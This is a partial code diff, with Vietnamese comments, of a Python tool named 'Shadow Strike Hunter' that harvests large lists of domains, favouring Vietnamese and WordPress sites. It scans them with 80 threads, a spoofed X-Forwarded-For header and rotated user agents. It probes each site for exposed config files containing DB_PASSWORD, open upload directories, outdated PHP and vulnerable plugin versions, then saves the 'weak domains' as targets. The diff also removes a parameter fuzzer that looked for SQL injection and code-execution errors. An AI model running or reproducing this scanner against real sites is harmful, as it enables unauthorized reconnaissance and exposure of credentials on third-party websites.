-        self.targets = cleaned_targets
-        print(f"{G}[✅] Tổng kho mục tiêu: {len(self.targets):,} domain.{W}")
+        # LỌC VÀ LÀM SẠCH
+        print(f"{C}[*] Đang lọc và làm sạch domain...{W}")
+        
+        cleaned_domains = set()
+        for domain in all_domains:
+            domain = domain.strip()
+            if (domain and 
+                '.' in domain and 
+                len(domain) < 100 and
+                domain.count('.') >= 1):
+                
+                # Loại bỏ domain rác
+                bad_patterns = [
+                    'test.', 'dev.', 'staging.', 'localhost', 
+                    '127.0.0.1', 'example.', 'dummy.', 'invalid.',
+                    '0.0.0.0', '255.255.255.255', '::1',
+                    'mail.', 'ftp.', 'smtp.', 'pop.', 'imap.',  # Email servers
+                ]
+                
+                if not any(bad in domain for bad in bad_patterns):
+                    # Ưu tiên domain Việt Nam và WordPress
+                    if any(x in domain for x in ['.vn', 'wordpress', 'wp-', 'blog']):
+                        cleaned_domains.add(domain)
+        
+        self.targets = cleaned_domains
+        
+        # Lưu kết quả
+        if self.targets:
+            with open('collected_domains_massive.txt', 'w', encoding='utf-8') as f:
+                for domain in sorted(self.targets):
+                    f.write(domain + '\n')
+            
+            # Thống kê
+            vn_domains = [d for d in self.targets if '.vn' in d]
+            wp_domains = [d for d in self.targets if any(x in d for x in ['wordpress', 'wp-'])]
+            
+            print(f"\n{G}{BOLD}[✅] THU THẬP THÀNH CÔNG!{W}")
+            print(f"{G}[*] Tổng domain: {len(self.targets):,}{W}")
+            print(f"{G}[*] Domain .vn: {len(vn_domains):,}{W}")
+            print(f"{G}[*] Domain WordPress: {len(wp_domains):,}{W}")
+            print(f"{G}[*] Đã lưu: collected_domains_massive.txt{W}")
+            
+            # Hiển thị 20 domain đầu
+            print(f"\n{C}[*] 20 domain đầu tiên:{W}")
+            for i, domain in enumerate(list(self.targets)[:20]):
+                print(f"  {i+1:2d}. {domain}")
+        else:
+            print(f"{R}[!] KHÔNG THU THẬP ĐƯỢC DOMAIN NÀO!{W}")
+            print(f"{Y}[*] Tạo file domains.txt với danh sách domain của bạn{W}")
 
-
-
-
-
+    # CÁC HÀM KHÁC GIỮ NGUYÊN...
     def get_plugin_version(self, base_url, slug, headers, proxy):
         paths = [
             f"/wp-content/plugins/{slug}/readme.txt",
@@ -451,7 +517,7 @@ class ShadowStrikeHunter:
         for path in paths:
             try:
                 url = base_url.rstrip('/') + path
-                r = requests.get(url, headers=headers, proxies=proxy, timeout=6, verify=False)
+                r = requests.get(url, headers=headers, proxies=proxy, timeout=5, verify=False)
                 if r.status_code == 200:
                     match = re.search(r'(?:Stable tag|Version):\s*([\d\.]+)', r.text, re.IGNORECASE)
                     return match.group(1) if match else "Unknown"
@@ -465,88 +531,6 @@ class ShadowStrikeHunter:
         except:
             return domain
 
-    # THÊM TÍNH NĂNG FUZZ PARAMETER
-    def fuzz_parameters(self, base_url, headers, proxy):
-        """Fuzz các parameter trên URL"""
-        findings = []
-        
-        # Tạo danh sách URL để fuzz
-        fuzz_urls = [
-            base_url,
-            base_url.rstrip('/') + '/wp-admin/',
-            base_url.rstrip('/') + '/wp-login.php',
-            base_url.rstrip('/') + '/index.php',
-            base_url.rstrip('/') + '/admin.php',
-            base_url.rstrip('/') + '/administrator/index.php'
-        ]
-        
-        for url in fuzz_urls:
-            try:
-                # Lấy response gốc để so sánh
-                orig_resp = requests.get(url, headers=headers, proxies=proxy, timeout=8, verify=False, allow_redirects=False)
-                orig_length = len(orig_resp.content)
-                orig_hash = hashlib.md5(orig_resp.content).hexdigest()
-                
-                # Fuzz với một số parameter quan trọng
-                test_params = random.sample(self.fuzz_parameters, min(15, len(self.fuzz_parameters)))  # Chọn ngẫu nhiên 15 param
-                test_values = random.sample(self.fuzz_values, min(10, len(self.fuzz_values)))  # Chọn ngẫu nhiên 10 value
-                
-                for param in test_params:
-                    for value in test_values[:3]:  # Chỉ test 3 giá trị đầu cho mỗi param
-                        try:
-                            time.sleep(random.uniform(0.2, 0.5))
-                            
-                            # Tạo URL với parameter
-                            if '?' in url:
-                                fuzz_url = f"{url}&{param}={value}"
-                            else:
-                                fuzz_url = f"{url}?{param}={value}"
-                            
-                            # Gửi request
-                            resp = requests.get(fuzz_url, headers=headers, proxies=proxy, 
-                                              timeout=8, verify=False, allow_redirects=False)
-                            
-                            new_length = len(resp.content)
-                            new_hash = hashlib.md5(resp.content).hexdigest()
-                            
-                            # Kiểm tra sự khác biệt
-                            if new_hash != orig_hash:
-                                diff_percent = abs(new_length - orig_length) / max(orig_length, 1) * 100
-                                
-                                if diff_percent > 30:  # Nếu khác biệt > 30%
-                                    # Kiểm tra các dấu hiệu lỗi
-                                    error_patterns = [
-                                        r'error', r'warning', r'notice', r'undefined',
-                                        r'mysql', r'database', r'syntax',
-                                        r'file not found', r'cannot', r'failed',
-                                        r'permission denied', r'access denied',
-                                        r'sqli', r'sql injection', r'xss',
-                                        r'remote code execution', r'command execution'
-                                    ]
-                                    
-                                    content_lower = resp.text.lower()
-                                    errors_found = []
-                                    for pattern in error_patterns:
-                                        if re.search(pattern, content_lower):
-                                            errors_found.append(pattern)
-                                    
-                                    if errors_found or diff_percent > 50:
-                                        findings.append(f"{R}[PARAM_FUZZ] {param}={value} tại {url} - Diff: {diff_percent:.1f}%{W}")
-                                        if errors_found:
-                                            findings.append(f"   |-- Errors: {', '.join(errors_found[:3])}")
-                                        break  # Dừng fuzz param này nếu tìm thấy lỗi
-                        except:
-                            continue
-                    
-                    # Nếu đã tìm thấy lỗi với param này, chuyển sang param tiếp theo
-                    if any('[PARAM_FUZZ]' in f for f in findings[-3:]):  # Kiểm tra 3 findings gần nhất
-                        break
-            
-            except:
-                continue
-        
-        return findings
-
     def audit(self, domain):
         decoded_domain = self.decode_domain(domain)
         findings = []
@@ -554,24 +538,22 @@ class ShadowStrikeHunter:
         headers = {
             'User-Agent': random.choice(self.user_agents),
             'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-            'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8']),
-            'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Referer': 'https://google.com',
         }
 
         base_url = None
-        is_wp = False
-        
         for proto in ['https', 'http']:
             url = f"{proto}://{domain}"
             try:
-                time.sleep(random.uniform(1.5, 3.5))
-                r_main = requests.get(url, headers=headers, proxies=proxy, timeout=12, verify=False)
+                time.sleep(random.uniform(0.1, 0.5))  # SIÊU NHANH!
+                r_main = requests.get(url, headers=headers, proxies=proxy, timeout=6, verify=False)
                 text_lower = r_main.text.lower()
                 is_wp = any(x in text_lower for x in ['wp-content', 'wp-includes', 'wp-json', 'wordpress'])
                 status_tag = f"{P}[WP]{W}" if is_wp else f"{C}[NON-WP]{W}"
 
                 with self.lock:
-                    sys.stdout.write(f"\r{Y}[*] Testing: {status_tag} {decoded_domain[:30]}{W} " + " " * 20)
+                    sys.stdout.write(f"\r{Y}[*] Testing: {status_tag} {decoded_domain[:50]}{W}")
                     sys.stdout.flush()
 
                 if is_wp:
@@ -579,14 +561,23 @@ class ShadowStrikeHunter:
                     # Check PHP version
                     php_ver = r_main.headers.get('X-Powered-By', '')
                     if 'PHP/' in php_ver:
-                        php_version = re.search(r'PHP/([\d\.]+)', php_ver).group(1) if re.search(r'PHP/([\d\.]+)', php_ver) else ''
-                        if php_version and float(php_version[:3]) < 8.0:
-                            findings.append(f"{R}[HIGH RISK] Outdated PHP v{php_version} - Multiple Vulns{W}")
+                        match = re.search(r'PHP/([\d\.]+)', php_ver)
+                        if match:
+                            php_version = match.group(1)
+                            try:
+                                if float(php_version[:3]) < 8.0:
+                                    findings.append(f"{R}[HIGH RISK] Outdated PHP v{php_version} - Multiple Vulns{W}")
+                            except:
+                                pass
+                    
                     # Check directory listing
-                    uploads_url = base_url.rstrip('/') + '/wp-content/uploads/'
-                    r_uploads = requests.get(uploads_url, headers=headers, proxies=proxy, timeout=7)
-                    if r_uploads.status_code == 200 and ('Index of' in r_uploads.text or 'parent directory' in r_uploads.text):
-                        findings.append(f"{Y}[DIR LIST] Exposed Uploads: {uploads_url}{W}")
+                    try:
+                        uploads_url = base_url.rstrip('/') + '/wp-content/uploads/'
+                        r_uploads = requests.get(uploads_url, headers=headers, proxies=proxy, timeout=3, verify=False)
+                        if r_uploads.status_code == 200 and ('Index of' in r_uploads.text or 'parent directory' in r_uploads.text):
+                            findings.append(f"{Y}[DIR LIST] Exposed Uploads: {uploads_url}{W}")
+                    except:
+                        pass
                     break
             except:
                 continue
@@ -596,98 +587,112 @@ class ShadowStrikeHunter:
                 self.processed += 1
             return
 
-        # Quét endpoint
+        # Quét endpoint SIÊU NHANH
         for path, label in self.critical_endpoints:
-            with self.semaphore:
-                try:
-                    time.sleep(random.uniform(0.4, 1.2))
-                    full_url = base_url.rstrip('/') + path
-                    r = requests.get(full_url, headers=headers, proxies=proxy, timeout=7, verify=False, allow_redirects=False)
-                    if r.status_code == 200 and len(r.content) > 50:
-                        if any(ind in r.text for ind in ['DB_PASSWORD', '<?php', 'Index of', 'WPRESS', 'Stable tag']):
-                            findings.append(f"{R}[CRITICAL] {label}: {full_url}{W}")
-                except:
-                    continue
+            try:
+                time.sleep(0.05)  # CỰC NHANH!
+                full_url = base_url.rstrip('/') + path
+                r = requests.get(full_url, headers=headers, proxies=proxy, timeout=3, verify=False, allow_redirects=False)
+                if r.status_code == 200 and len(r.content) > 20:
+                    content_preview = r.text[:300]
+                    if any(ind in content_preview for ind in ['DB_PASSWORD', '<?php', 'Index of', 'WPRESS']):
+                        findings.append(f"{R}[CRITICAL] {label}: {full_url}{W}")
+            except:
+                continue
 
         # Check plugin version
         plugin_slugs = set(re.findall(r'/wp-content/plugins/([^/\'"]+)/', r_main.text.lower()))
-        if plugin_slugs:
-            print(f"\n{Y}[PLUGIN] Detected on {decoded_domain}: {', '.join(list(plugin_slugs)[:6])}{W}")
-            for slug in list(plugin_slugs)[:10]:
+        if plugin_slugs and findings:  # Chỉ check nếu đã có findings
+            for slug in list(plugin_slugs)[:6]:
                 ver = self.get_plugin_version(base_url, slug, headers, proxy)
-                if ver != "N/A" and ver != "Unknown":
-                    status = f"{P}[PLUGIN] {slug} v{ver}{W}"
-                    if slug in self.vuln_plugins:
-                        for old in self.vuln_plugins[slug]['old']:
-                            if ver.startswith(tuple(old.split('.'))) or ver < old.lstrip('<'):
-                                status = f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}"
-                                findings.append(status)
-                    print(f" → {status}")
-
-        # THÊM FUZZ PARAMETER NẾU LÀ WORDPRESS
-        if is_wp:
-            print(f"{C}[*] Đang fuzz parameter cho {decoded_domain}{W}")
-            fuzz_findings = self.fuzz_parameters(base_url, headers, proxy)
-            findings.extend(fuzz_findings)
+                if ver not in ["N/A", "Unknown"] and slug in self.vuln_plugins:
+                    for old in self.vuln_plugins[slug]['old']:
+                        try:
+                            if old.startswith('<'):
+                                old_ver = old[1:]
+                                ver_num = ''.join(filter(str.isdigit, ver))
+                                old_num = ''.join(filter(str.isdigit, old_ver))
+                                if ver_num and old_num and int(ver_num) < int(old_num):
+                                    findings.append(f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}")
+                                    break
+                        except:
+                            pass
 
         # Báo cáo
         with self.lock:
             self.processed += 1
             if findings:
                 self.found_count += 1
-                print(f"\n{G}{BOLD}[🎯] SUCCESS #{self.found_count}: {decoded_domain}{W}")
+                print(f"\n{G}{BOLD}[🎯] #{self.found_count}: {decoded_domain}{W}")
                 for f in findings:
                     print(f" |-- {f}")
+                
                 with open(self.output, 'a', encoding='utf-8') as f:
                     clean = [re.sub(r'\033\[[0-9;]*m', '', i) for i in findings]
-                    f.write(f"TARGET: {decoded_domain} (original: {domain})\n" + "\n".join(clean) + "\n\n")
+                    f.write(f"TARGET: {decoded_domain}\n" + "\n".join(clean) + "\n\n")
+                
                 with open(self.weak_domains_file, 'a', encoding='utf-8') as wf:
                     wf.write(f"{decoded_domain}\n")
-                # Lưu JSON report
+                
                 with open(self.vuln_report_json, 'a', encoding='utf-8') as jf:
                     jf.write(json.dumps({"domain": decoded_domain, "findings": clean}, ensure_ascii=False) + "\n")
+                
                 sys.stdout.write("\a")
 
-            perc = (self.processed / len(self.targets)) * 100 if self.targets else 0
-            sys.stdout.write(f"\r{Y}[*] Progress: {self.processed}/{len(self.targets)} ({perc:.2f}%) | Ghosting: {decoded_domain[:25]}...{W}")
+            # Progress với tốc độ
+            elapsed = time.time() - getattr(self, 'start_time', time.time())
+            speed = self.processed / elapsed if elapsed > 0 else 0
+            sys.stdout.write(f"\r{Y}[*] {self.processed}/{len(self.targets)} ({self.processed/len(self.targets)*100:.1f}%) | {speed:.1f} domains/sec{W}")
             sys.stdout.flush()
 
-    def start(self, threads=30):
+    def start(self, threads=80):  # 80 THREADS SIÊU MẠNH!
+        self.start_time = time.time()
         self.fetch_infinity_sources()
+        
         if not self.targets:
-            print(f"{R}[!] Không tìm thấy domain nào!{W}")
+            print(f"{R}[!] No domains to scan!{W}")
+            print(f"{Y}[*] Create a file 'domains.txt' with your target domains{W}")
             return
 
-        print(f"\n{B}{BOLD}[SHADOW STRIKE ACTIVATED]{W}")
+        print(f"\n{B}{BOLD}[🚀 SHADOW STRIKE MASSIVE SCAN ACTIVATED]{W}")
         print(f"{B}[*] Threads: {threads} | Targets: {len(self.targets):,}{W}")
-        print(f"{B}[*] Parameter Fuzzing: ENABLED (15 params × 3 values per domain){W}\n")
+        print(f"{B}[*] Estimated time: {len(self.targets)/80:.1f} seconds{W}\n")
         
-        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-            executor.map(self.audit, list(self.targets))
+        # Tạo thư mục output
+        os.makedirs('shadow_strike_massive', exist_ok=True)
+        self.output = 'shadow_strike_massive/SHADOW_STRIKE_2026.txt'
+        self.weak_domains_file = 'shadow_strike_massive/WEAK_DOMAINS.txt'
+        self.vuln_report_json = 'shadow_strike_massive/VULN_REPORT_2026.json'
+        
+        try:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+                executor.map(self.audit, list(self.targets))
+        except KeyboardInterrupt:
+            print(f"\n{R}[!] Scan interrupted!{W}")
+        except Exception as e:
+            print(f"{R}[!] Error: {str(e)}{W}")
         
         # Summary
-        print(f"\n{G}{BOLD}[✅] SCAN HOÀN TẤT!{W}")
-        print(f"{G}[*] Đã quét: {self.processed} domain{W}")
-        print(f"{G}[*] Tìm thấy lỗ hổng: {self.found_count} domain{W}")
-        print(f"{G}[*] Kết quả lưu tại: {self.output}, {self.weak_domains_file}, {self.vuln_report_json}{W}")
+        total_time = time.time() - self.start_time
+        print(f"\n{G}{BOLD}[✅] MASSIVE SCAN COMPLETED IN {total_time:.1f}s!{W}")
+        print(f"{G}[*] Total scanned: {self.processed:,}{W}")
+        print(f"{G}[*] Vulnerable found: {self.found_count:,}{W}")
+        print(f"{G}[*] Average speed: {self.processed/total_time:.1f} domains/sec{W}")
+        print(f"{G}[*] Success rate: {self.found_count/max(self.processed,1)*100:.1f}%{W}")
+        print(f"{G}[*] Results saved in: shadow_strike_massive/{W}")
 
 if __name__ == "__main__":
     try:
         print(f"""{B}
     ╔══════════════════════════════════════════════════════╗
-    ║      SHADOW STRIKE HUNTER 2026 - ENHANCED EDITION    ║
-    ║      Domain Expansion + Parameter Fuzzing Enabled    ║
+    ║    SHADOW STRIKE HUNTER - MASSIVE DOMAIN EDITION     ║
+    ║    10+ Sources | 80 Threads | Ultra Fast Scanning    ║
     ╚══════════════════════════════════════════════════════╝{W}""")
         
-        # Tạo thư mục output nếu chưa có
-        os.makedirs('shadow_strike_results', exist_ok=True)
         hunter = ShadowStrikeHunter()
-        hunter.output = 'shadow_strike_results/SHADOW_STRIKE_2026.txt'
-        hunter.weak_domains_file = 'shadow_strike_results/WEAK_DOMAINS.txt'
-        hunter.vuln_report_json = 'shadow_strike_results/VULN_REPORT_2026.json'
+        hunter.start(threads=80)
         
-        hunter.start(threads=50)
     except KeyboardInterrupt:
-        print(f"\n{R}[!] Dừng bởi người dùng.{W}")
+        print(f"\n{R}[!] Stopped by user.{W}")
     except Exception as e:
-        print(f"{R}[!] Lỗi không mong muốn: {str(e)}{W}")
+        print(f"{R}[!] Error: {str(e)}{W}")
